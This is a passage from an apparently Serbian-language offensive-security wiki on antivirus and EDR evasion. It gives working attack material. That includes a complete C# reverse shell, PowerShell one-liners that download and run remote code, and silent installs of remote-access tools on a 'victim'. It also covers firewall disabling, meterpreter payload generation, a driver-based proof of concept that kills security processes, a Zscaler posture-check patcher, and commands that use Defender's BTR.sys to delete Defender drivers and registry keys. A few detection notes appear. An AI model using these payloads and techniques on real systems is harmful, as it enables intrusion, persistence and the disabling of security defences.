- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako koristiti jezik `C++11/14` za generisanje obfuscated koda u vreme kompilacije, bez korišćenja eksternih alata i bez izmena compiler-a.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operacija generisanih pomoću C++ template metaprogramming framework-a, što osobi koja želi da crack-uje aplikaciju dodatno otežava posao.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscate različite PE fajlove, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan engine za metamorphic code namenjen proizvoljnim executable fajlovima.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za fine-grained code obfuscation za LLVM-supported jezike koji koristi ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly koda tako što regularne instrukcije transformiše u ROP chains, čime narušava našu prirodnu predstavu normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u jeziku Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeći EXE/DLL u shellcode i zatim da ga učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih executable fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je security mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicious aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu reputation-based pristupa, što znači da će aplikacije koje se retko preuzimaju aktivirati SmartScreen, čime će krajnji korisnik biti upozoren i sprečen da izvrši fajl (iako se fajl i dalje može izvršiti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier, koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kog je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da executable fajlovi potpisani **trusted** signing certificate-om **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih upakujete unutar neke vrste container-a, kao što je ISO. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u output container-e kako bi zaobišao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a unutar ISO datoteka pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **loguju događaje**. Međutim, bezbednosni proizvodi ga takođe mogu koristiti za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično načinu na koji se AMSI onemogućava (zaobilazi), moguće je učiniti da funkcija **`EtwEventWrite`** procesa u user space-u odmah vrati rezultat bez logovanja događaja. To se postiže patch-ovanjem funkcije u memoriji tako da odmah vrati rezultat, čime se efektivno onemogućava ETW logovanje za taj proces.

Više informacija možete pronaći na adresama **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i i dalje predstavlja veoma dobar način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju bez pristupanja disku, moraćemo da brinemo samo o patch-ovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava direktno izvršavanje C# assembly-ja u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Ovo podrazumeva **pokretanje novog sacrificial procesa**, inject-ovanje vašeg zlonamernog post-exploitation koda u taj novi proces, izvršavanje zlonamernog koda i, po završetku, terminiranje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost fork and run metode jeste to što se izvršavanje odvija **izvan** našeg Beacon implant procesa. To znači da, ako nešto pođe po zlu ili bude otkriveno tokom naše post-exploitation aktivnosti, postoji **mnogo veća šansa** da će naš **implant preživeti.** Nedostatak je **veća verovatnoća da ćete biti otkriveni putem Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o inject-ovanju zlonamernog post-exploitation koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali je nedostatak to što, ako nešto pođe po zlu tokom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da ćete **izgubiti svoj beacon**, jer može doći do pada procesa.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly-je možete učitavati i **iz PowerShell-a**; pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video kompanije S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

Kao što je predloženo u projektu [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod pomoću drugih jezika tako što se kompromitovanoj mašini omogući pristup **interpreter okruženju instaliranom na Attacker Controlled SMB share-u**.

Omogućavanjem pristupa Interpreter Binaries datotekama i okruženju na SMB share-u možete **izvršavati proizvoljan kod u tim jezicima u memoriji** kompromitovane mašine.

Repozitorijum navodi: Defender i dalje skenira skripte, ali korišćenjem jezika Go, Java, PHP itd. dobijamo **veću fleksibilnost za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, ne-obfuskovanih reverse shell skripti u ovim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping manipuliše access token-om bezbednosnog proizvoda kao što su EDR ili AV. Smanjivanje privilegija token-a može ostaviti proces aktivnim, dok mu onemogućava izvršavanje privilegovanih radnji inspekcije ili remedijacije.

Da bi se ovo sprečilo, Windows bi mogao **da spreči eksterne procese** da dobiju handlove nad token-ima bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), jednostavno je deploy-ovati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole i održavanje persistence-a:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste preuzeli MSI datoteku.
2. Tiho pokrenite installer na računaru žrtve (potreban je admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop-a i kliknite na „next“. Čarobnjak će zatim zatražiti autorizaciju; kliknite na dugme „Authorize“ da biste nastavili.
4. Izvršite dostavljenu komandu uz potrebne izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).


## Napredna evazija

Evazija je veoma složena tema; ponekad morate uzeti u obzir mnoge različite izvore telemetrije na samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kog delujete imaće sopstvene prednosti i slabosti.

Toplo preporučujem da pogledate ovo predavanje autora [@ATTL4S](https://twitter.com/DaniLJ94) kako biste stekli osnovu za naprednije tehnike evazije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odlično predavanje autora [@mariuszbit](https://twitter.com/mariuszbit) o temi Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera koje delove Defender pronalazi zlonamernim**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** sve dok **ne utvrdi koji deo Defender** pronalazi zlonamernim i izdvojiti ga za vas.\
Drugi alat koji radi **istu stvar jeste** [**avred**](https://github.com/dobin/avred), uz javno dostupnu web uslugu na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows sistemi su sadržali **Telnet server** koji ste mogli da instalirate (kao administrator) izvršavanjem:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** kada se sistem pokrene i **pokrenite** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promena telnet porta** (stealth) i onemogućavanje firewall-a:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, ne setup)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarni fajl _**winvnc.exe**_ i **novo** kreirani fajl _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

**attacker** treba da **pokrene unutar** svog **hosta** binarni fajl `vncviewer.exe -listen 5900`, kako bi bio **spreman** da prihvati reverse **VNC connection**. Zatim, na **victim**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste očuvali stealth, ne smete da uradite nekoliko stvari

- Nemojte pokretati `winvnc` ako je već pokrenut, jer ćete aktivirati [popup](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez fajla `UltraVNC.ini` u istom direktorijumu, jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć, jer ćete aktivirati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT-a:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite listener** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će vrlo brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# pomoću compiler-a
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje python-a za pravljenje injectora, primer:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Drugi alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Ubijanje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** za onemogućavanje endpoint zaštite pre isporuke ransomware-a. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni AV servisi zaštićeni mehanizmom Protected-Process-Light (PPL) ne mogu da blokiraju.<sup>[[12]](#references)</sup>

Ključne napomene
1. **Potpisani driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali je binarija zapravo legitimno potpisani driver `AToolsKrnl64.sys` kompanije Antiy Labs, iz njenog „System In-Depth Analysis Toolkit“-a. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće kako bi `\\.\ServiceMouse` postao dostupan iz user land-a.
3. **IOCTL-ovi koje driver izlaže**
| IOCTL kod | Mogućnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekid proizvoljnog procesa prema PID-u (koristi se za gašenje Defender/EDR servisa) |
| `0x990000D0` | Brisanje proizvoljnog fajla sa diska |
| `0x990001D0` | Unload drivera i uklanjanje servisa |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi user-mode zaštite; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, prekine ih ili menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detekcija / ublažavanje
•  Omogućite Microsoftovu listu blokiranih ranjivih drivera (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.
•  Nadgledajte kreiranje novih *kernel* servisa i generišite upozorenje kada se driver učitava iz direktorijuma u koji svi mogu da upisuju ili kada nije prisutan na allow-listi.
•  Pratite user-mode handle-ove ka prilagođenim device objektima, nakon čega slede sumnjivi `DeviceIoControl` pozivi.

### Zaobilaženje Zscaler Client Connector provera posture-a putem patchovanja binarija na disku

Zscaler **Client Connector** lokalno primenjuje pravila za posture uređaja i oslanja se na Windows RPC za komunikaciju rezultata sa drugim komponentama. Dve slabe dizajnerske odluke omogućavaju potpuno zaobilaženje:

1. Procena posture-a se obavlja **u potpunosti na klijentskoj strani** (serveru se šalje boolean vrednost).
2. Interni RPC endpoint-i proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Patchovanjem četiri potpisane binarije na disku** oba mehanizma mogu biti neutralisana:

| Binarija | Originalna logika koja se patchuje | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa je svaka provera usklađena |
| `ZSAService.exe` | Indirektni poziv ka `WinVerifyTrust` | Zamenjen instrukcijama NOP ⇒ svaki proces, čak i nepotpisan, može da se poveže na RPC cevi |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Zaobiđene |

Minimalni odlomak patcher-a:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i ponovnog pokretanja service stack-a:

* **Sve** posture provere prikazuju status **green/compliant**.
* Unsigned ili izmenjeni binaries mogu da otvore named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Compromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler policies.

Ova studija slučaja pokazuje kako se odluke o poverenju zasnovane isključivo na client-side logici i jednostavne provere potpisa mogu zaobići sa nekoliko byte patch-eva.

## Zloupotreba trusted functionality programa Microsoft Defender `BTR.sys`

Defender-ov **Boot-Time Removal** driver predstavlja koristan kontraprimer klasičnom BYOVD-u. `BTR.sys` je legitimna Microsoft-signed remediation komponenta bez memory-corruption bug-a i bez IOCTL interfejsa; nakon dobijanja administratorskog pristupa i `SeLoadDriverPrivilege`, operator umesto toga može da falsifikuje njegovu privatnu remediation transakciju i dobije predviđene Ring-0 operacije nad fajlovima i registry-jem. Ovo je **post-compromise AV/EDR-neutralization primitive, a ne initial access ili privilege escalation**, a driver se može izdvojiti iz sopstvenog `MpEngine.dll` fajla na targetu, iz `BOOTTIMETOOL` resource-a, umesto importovanja upadljivog third-party driver-a.<sup>[[36]](#references)</sup>

### Priprema one-shot driver-a

Defender obično zapisuje resource kao fajl nasumičnog imena `[a-z]{8}.sys` i registruje kernel service sa sličnim imenom. `DriverEntry` čita vrednost `Args` service-a, otvara navedeni NTFS ADS, dešifruje i validira action list, upisuje feedback i nakon uspešnog izvršavanja vraća `0xC0000056` (`STATUS_DELETE_PENDING`), tako da se driver unload-uje umesto da ostane rezidentan. Falsifikovani service ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Tok `:changelist` sadrži jedan RC4-enkriptovani blob. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, tako da enkripcija nije granica autorizacije. Ispravan plaintext ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i transaction ID izveden iz payload-a), nakon čega slede null-terminated UTF-16 feedback putanja i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i action-specific podatke koji se završavaju sa **tačno četiri NUL bajta**. Svaki region zaglavlja/podataka nezavisno se proverava pomoću CRC-32 polinoma `0xEDB88320`, sa početnim stanjem `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija izlažu ove kernel primitive.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Brisanje datoteke, uključujući zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanjanje praznog direktorijuma |
| 3 | `[Flags][source][destination]` | Premeštanje datoteke u protected putanju koju je izabrao attacker; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno brisanje registry ključa |
| 5 | `[Flags][key path + "\\" + value]` | Brisanje registry vrednosti |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreiranje/ažuriranje registry vrednosti i kreiranje nedostajućih putanja ključa |

Kod akcija 5 i 6, separator ključa/vrednosti u on-wire formatu su **dve uzastopne obrnute kose crte**; konvencionalno formatirana putanja neće biti pravilno razdvojena. Feedback datoteka uglavnom preslikava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultujući `NTSTATUS`. Kod akcija 1 i 2, koje nemaju početno polje flags, BTR pomera putanju u četiri rezervisana završna bajta kako bi napravio prostor za taj status.<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow i prozor ranog boot-a

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementira kompletan chain: ekstraktuje `BTR.sys` iz lokalnog Defender-a, kreira `<random>.sys:changelist` i feedback stream, serijalizuje/proverava checksum/enkriptuje chained actions, direktno kreira service registry ključ, a zatim poziva `NtLoadDriver` za `-trigger now` ili ga ostavlja kao system-start driver za `-trigger boot`. Direktno registry staging izbegava uobičajenu SCM `CreateServiceW` putanju i zato **ne proizvodi** service-install Event ID 7045. Artefakti pokrenuti pri boot-u mogu se kasnije ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` nije upotrebljiv zato što BTR obavlja I/O nad datotekama iz `DriverEntry` pre nego što storage stack i veza `SystemRoot` budu spremni. `Start=1`, zajedno sa grupom visoke prioritetnosti `Boot Bus Extender`, izvršava se u fazi 1: NTFS je upotrebljiv, ali se mnogi security driveri koji se pokreću pri startovanju sistema i EDR servisi u user-mode još nisu inicijalizovali. Boot-start filteri kao što je `WdFilter` možda su već učitani, ali BTR može ukloniti njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja, kao i obrisati izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz zato što se BTR izvršava nakon boot-start evaluacije i poseduje važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji se izvršava u jednoj transakciji. PoC dodaje Action 1 na početak za hard-coded `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obrađuje sopstveni zahtev za brisanje i uklanja ga pre unloadovanja. Time se smanjuju tragovi, dok postavljanje povratnih informacija u `<random>.sys:<random>.dat` omogućava uklanjanje drivera i oba stream-a zajedno.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju visoke pouzdanosti

Pravila zasnovana samo na potpisima i Microsoft vulnerable-driver blocklist ne rešavaju zloupotrebu predviđene BTR funkcionalnosti. Dajte prednost sledećim behavioral korelacijama, uz razlikovanje legitimnog Defender porekla od proizvoljnog launchera.<sup>[[36]](#references)</sup>

